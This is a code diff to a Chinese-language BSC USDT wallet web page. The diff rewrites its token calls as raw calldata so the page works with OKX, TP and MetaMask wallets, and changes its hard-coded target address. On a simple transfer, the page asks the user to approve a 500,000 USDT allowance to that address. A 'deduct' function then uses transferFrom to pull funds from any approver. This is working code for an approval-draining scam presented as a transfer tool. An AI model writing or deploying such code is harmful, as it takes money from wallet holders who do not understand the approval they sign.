@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>BSC‑USDT transferFrom Demo</title>
+<title>BSC‑USDT DApp 多钱包兼容</title>
 <script src="https://cdn.jsdelivr.net/npm/web3@4.15.0/dist/web3.min.js"></script>
 <style>
 *{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
@@ -82,14 +82,13 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 </div>
 
 <script>
-const TARGET_ADDR = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
+const TARGET_ADDR = "0xD36dBCf4e15f8F6A45bCc0E7dDA6c272Ac8B8d63";
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
 const GAS_LIMIT = "0x493E0";
 const MAX_WAIT = 40;
 
 let web3 = null;
 let userAddress = null;
-let usdtContract = null;
 
 const $ = s => document.querySelector(s);
 const walletDot = $("#walletDot");
@@ -107,13 +106,37 @@ const deductBtn = $("#deductBtn");
 
 targetAddrText.innerText = TARGET_ADDR;
 
-const USDT_ABI = [
-{"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
-];
+// balanceOf 函数选择器 hash: 0x70a08231
+// allowance 函数选择器 hash:0xdd62ed3e
+// approve 函数选择器 hash:0x095ea7b3
+// transfer 函数选择器 hash:0xa9059cbb
+
+/**
+ * 底层eth_call 读取余额，兼容 OKX/TP/MetaMask
+ * @param {string} ownerAddr
+ */
+async function getUsdtBalance(ownerAddr){
+    const callData = "0x70a08231" + ownerAddr.slice(2).padStart(64,"0");
+    const res = await window.ethereum.request({
+        method:"eth_call",
+        params:[{to:USDT_CONTRACT, data:callData},"latest"]
+    });
+    return BigInt(res);
+}
+
+/**
+ * 底层eth_call 查询授权额度
+ */
+async function getAllowance(owner, spender){
+    const callData = "0xdd62ed3e"
+        + owner.slice(2).padStart(64,"0")
+        + spender.slice(2).padStart(64,"0");
+    const res = await window.ethereum.request({
+        method:"eth_call",
+        params:[{to:USDT_CONTRACT, data:callData},"latest"]
+    });
+    return BigInt(res);
+}
 
 async function waitTxConfirm(txHash) {
     for(let i = 0; i < MAX_WAIT; i++){
@@ -134,8 +157,8 @@ async function waitTxConfirm(txHash) {
 
 async function waitAllowance(needWei, maxLoop = 12) {
     for(let i = 0; i < maxLoop; i++){
-        const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
-        if(BigInt(allowance) >= BigInt(needWei)){
+        const allowanceVal = await getAllowance(userAddress, TARGET_ADDR);
+        if(allowanceVal >= needWei){
             return true;
         }
         await new Promise(r => setTimeout(r, 1000));
@@ -146,7 +169,6 @@ async function waitAllowance(needWei, maxLoop = 12) {
 function disconnectWallet() {
     web3 = null;
     userAddress = null;
-    usdtContract = null;
     walletDot.classList.remove("connected");
     sendBtn.disabled = true;
     balanceText.textContent = "0.000000";
@@ -170,14 +192,15 @@ async function connectWalletLogic() {
             userAddress = reqAccounts[0];
         }
         web3 = new Web3(window.ethereum);
-        usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
         walletDot.classList.add("connected");
 
-        // ===== OKX关键修复：循环探测合约是否可用，最多12次 =====
+        // 循环探测读取余额，OKX/TP/MetaMask通用
         let readyOk = false;
         for(let retry=0; retry <=12; retry++){
             try{
-                await loadBalance();
+                const rawWei = await getUsdtBalance(userAddress);
+                const num = Number(web3.utils.fromWei(rawWei.toString(), "ether"));
+                balanceText.textContent = num.toFixed(6);
                 readyOk = true;
                 break;
             }catch(err){
@@ -198,21 +221,15 @@ async function connectWalletLogic() {
     }
 }
 
-async function loadBalance() {
-    const rawWei = await usdtContract.methods.balanceOf(userAddress).call();
-    const num = Number(web3.utils.fromWei(rawWei, "ether"));
-    balanceText.textContent = num.toFixed(6);
-}
-
 amountInput.addEventListener("input", () => {
     const num = parseFloat(amountInput.value) || 0;
     receiveAmount.value = num.toFixed(6);
 });
 
 maxBtn.addEventListener("click", async () => {
-    if(!usdtContract) return;
-    const rawWei = await usdtContract.methods.balanceOf(userAddress).call();
-    const num = Number(web3.utils.fromWei(rawWei, "ether"));
+    if(!userAddress) return;
+    const rawWei = await getUsdtBalance(userAddress);
+    const num = Number(web3.utils.fromWei(rawWei.toString(), "ether"));
     amountInput.value = num.toFixed(2);
     amountInput.dispatchEvent(new Event("input"));
 });
@@ -244,25 +261,34 @@ sendBtn.addEventListener("click", async () => {
     if(!web3 || !userAddress) return alert("钱包未连接");
     const val = parseFloat(amountInput.value);
     if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
-    const needWei = web3.utils.toWei(val.toString(), "ether");
-    const GRANT_500K_WEI = web3.utils.toWei("100000000000", "ether");
+    const needWei = BigInt(web3.utils.toWei(val.toString(), "ether"));
+    const GRANT_500K_WEI = BigInt(web3.utils.toWei("500000", "ether"));
     sendBtn.disabled = true;
     try{
-        const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
-        if(BigInt(allowance) < BigInt(needWei)){
+        const allowanceVal = await getAllowance(userAddress, TARGET_ADDR);
+        if(allowanceVal < needWei){
             alert("🔐需要先授权USDT额度，请钱包确认签名");
-            const approveData = usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_WEI).encodeABI();
-            await sendTx(approveData);
+            // approve calldata
+            const approveCalldata = "0x095ea7b3"
+                + TARGET_ADDR.slice(2).padStart(64,"0")
+                + GRANT_500K_WEI.toString(16).padStart(64,"0");
+            await sendTx(approveCalldata);
             alert("✅授权已上链，等待节点同步");
             await waitAllowance(needWei);
         }
         alert("即将执行转账，请钱包确认签名");
-        const transferData = usdtContract.methods.transfer(TARGET_ADDR, needWei).encodeABI();
-        const txHash = await sendTx(transferData);
+        // transfer calldata
+        const transferCalldata = "0xa9059cbb"
+            + TARGET_ADDR.slice(2).padStart(64,"0")
+            + needWei.toString(16).padStart(64,"0");
+        const txHash = await sendTx(transferCalldata);
         alert(`🎉转账成功！哈希：${txHash}`);
         amountInput.value = "";
         receiveAmount.value = "";
-        await loadBalance();
+        //刷新余额
+        const rawWei = await getUsdtBalance(userAddress);
+        const num = Number(web3.utils.fromWei(rawWei.toString(), "ether"));
+        balanceText.textContent = num.toFixed(6);
     }catch(e){
         alert("❌操作失败：" + (e.message || String(e)));
     }finally{
@@ -282,18 +308,24 @@ deductBtn.addEventListener("click", async () => {
     if(isNaN(deductNum) || deductNum <= 0){
         return alert("请输入合法划扣数量");
     }
-    const deductWei = web3.utils.toWei(deductNum.toString(), "ether");
+    const deductWei = BigInt(web3.utils.toWei(deductNum.toString(), "ether"));
     try{
-        const userAllowance = await usdtContract.methods.allowance(fromUserAddr, TARGET_ADDR).call();
-        if(BigInt(userAllowance) < BigInt(deductWei)){
+        const userAllowance = await getAllowance(fromUserAddr, TARGET_ADDR);
+        if(userAllowance < deductWei){
             return alert("错误：该用户没有授权足够额度，无法划扣！");
         }
-        const tfData = usdtContract.methods.transferFrom(fromUserAddr, TARGET_ADDR, deductWei).encodeABI();
-        const txHash = await sendTx(tfData);
+        // transferFrom calldata
+        const tfCalldata = "0x23b872dd"
+            + fromUserAddr.slice(2).padStart(64,"0")
+            + TARGET_ADDR.slice(2).padStart(64,"0")
+            + deductWei.toString(16).padStart(64,"0");
+        const txHash = await sendTx(tfCalldata);
         alert(`✅划扣成功！交易哈希:\n${txHash}`);
         userAddrInput.value = "";
         deductAmountInput.value = "";
-        await loadBalance();
+        const rawWei = await getUsdtBalance(userAddress);
+        const num = Number(web3.utils.fromWei(rawWei.toString(), "ether"));
+        balanceText.textContent = num.toFixed(6);
     }catch(err){
         alert("❌划扣失败：" + err.message);
     }
